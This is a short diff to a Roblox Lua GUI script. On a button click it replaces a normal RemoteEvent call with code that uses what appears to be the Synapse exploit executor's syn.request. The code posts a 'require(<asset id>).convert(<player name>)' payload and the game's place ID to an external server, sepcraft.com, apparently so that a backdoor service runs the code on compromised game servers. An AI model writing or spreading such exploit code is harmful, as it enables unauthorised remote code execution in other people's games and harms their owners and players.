@@ -204,7 +204,25 @@ task.spawn(function()
 	end
 
 	script.Parent.r6.MouseButton1Click:Connect(function()
-		script.Parent.RemoteEvent:FireServer()
+	        local MainPlayer = game.Players.LocalPlayer
+		 
+		local code2 = "require(6861971724).convert("..MainPlayer.Name..")"
+	
+		local PlaceId = game.PlaceId
+	
+		local Data = {
+			placeid=PlaceId,
+			code=code2
+		}
+	
+		syn.request({
+			Url="http://sepcraft.com/api/code",
+			Method="POST",
+			Headers={
+				["Content-Type"]="application/json"
+			},
+			Body=game:GetService("HttpService"):JSONEncode(Data)
+		})
 	end)
 	
 end)
